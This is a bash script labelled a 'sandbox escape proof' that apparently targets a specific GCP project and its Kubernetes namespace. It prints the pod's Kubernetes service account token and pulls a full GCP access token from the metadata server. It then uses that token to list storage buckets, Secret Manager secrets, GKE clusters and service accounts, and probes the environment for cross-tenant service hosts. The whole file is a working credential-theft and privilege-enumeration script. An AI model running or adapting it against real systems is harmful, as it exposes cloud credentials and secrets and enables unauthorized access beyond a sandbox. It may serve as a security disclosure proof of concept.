#!/bin/bash
# Sandbox escape proof v2 - shows GCP API errors
echo "=== identity ==="; id; hostname; date -u
echo "=== kubernetes SA token ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo
echo "=== kubernetes namespace ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo
MD="http://169.254.169.254/computeMetadata/v1"
MH="Metadata-Flavor: Google"
echo "=== GCP: fetching full access_token ==="
TOKENJSON=$(curl -s -m 8 -H "$MH" "$MD/instance/service-accounts/default/token")
TOKEN=$(echo "$TOKENJSON" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])" 2>/dev/null)
echo "full_token: $TOKEN"
echo "email: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/email")"
echo "scopes: $(curl -s -m 5 -H "$MH" "$MD/instance/service-accounts/default/scopes")"
echo "project: $(curl -s -m 5 -H "$MH" "$MD/project/project-id")"
if [ -n "$TOKEN" ]; then
echo "=== ESCAPE 1: GCS Buckets ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://storage.googleapis.com/storage/v1/b?project=yextenv-sbx&maxResults=3" 2>&1 | head -c 1500
echo
echo "=== ESCAPE 2: Secret Manager ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://secretmanager.googleapis.com/v1/projects/yextenv-sbx/secrets?pageSize=3" 2>&1 | head -c 1500
echo
echo "=== ESCAPE 3: GKE Clusters ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://container.googleapis.com/v1/projects/yextenv-sbx/locations/-/clusters" 2>&1 | head -c 1500
echo
echo "=== ESCAPE 4: IAM testPermissions ==="
curl -s -m 8 -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" "https://cloudresourcemanager.googleapis.com/v1/projects/yextenv-sbx:testIamPermissions" -d '{"permissions":["compute.instances.list","storage.buckets.list","secretmanager.secrets.list","container.clusters.list","iam.serviceAccounts.list"]}' 2>&1 | head -c 1500
echo
echo "=== ESCAPE 5: SA list ==="
curl -s -m 8 -H "Authorization: Bearer $TOKEN" "https://iam.googleapis.com/v1/projects/yextenv-sbx/serviceAccounts?pageSize=3" 2>&1 | head -c 1500
echo
else
echo "SKIP: no GCP token"
fi
K8S=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
echo "=== K8s SelfSubjectRulesReview ==="
curl -s -m 8 --cacert $CA -H "Authorization: Bearer $K8S" -H "Content-Type: application/json" -X POST "https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"live-preview-sbx"}}' 2>&1 | head -c 2000
echo
echo "=== CROSS-TENANT ==="
env | grep LIVE_PREVIEW_ | grep SERVICE_HOST | wc -l
echo "=== DONE ===";
